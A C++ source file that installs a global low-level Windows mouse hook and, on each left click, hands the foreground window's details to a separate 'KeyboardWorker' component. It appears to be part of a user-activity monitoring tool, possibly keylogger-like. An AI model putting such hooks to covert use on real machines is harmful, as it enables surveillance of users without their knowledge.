#include "services.hpp"

#if SERVICE_MOUSE_ENABLED

#include "winfx.hpp"
#include "lrcdatatypes.hpp"
#include "tools.hpp"

using namespace Services;

namespace
{
	static bool isRunning = false;

	static HHOOK hhkLowLevelMouse = NULL;

	LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (nCode == HC_ACTION)
		{
			switch (wParam)
			{
			case WM_LBUTTONDOWN:
				// Left mouse button down
				KeyboardWorker::Add(tools::GetWNDInfo(GetForegroundWindow()));
				break;
			case WM_RBUTTONDOWN:
				// Right mouse button down
				break;
			}
		}

		return CallNextHookEx(hhkLowLevelMouse, nCode, wParam, lParam);
	}
}

void Services::Mouse::Run()
{
	if (isRunning)
	{
		return;
	}

	if (hhkLowLevelMouse == NULL)
	{
		hhkLowLevelMouse = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, NULL, NULL);
	}


	isRunning = true;
}

void Services::Mouse::Stop()
{
	if (!isRunning)
	{
		return;
	}

	if (hhkLowLevelMouse != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelMouse);
		hhkLowLevelMouse = NULL;
	}

	isRunning = false;
}

#endif // SERVICE_MOUSE_ENABLED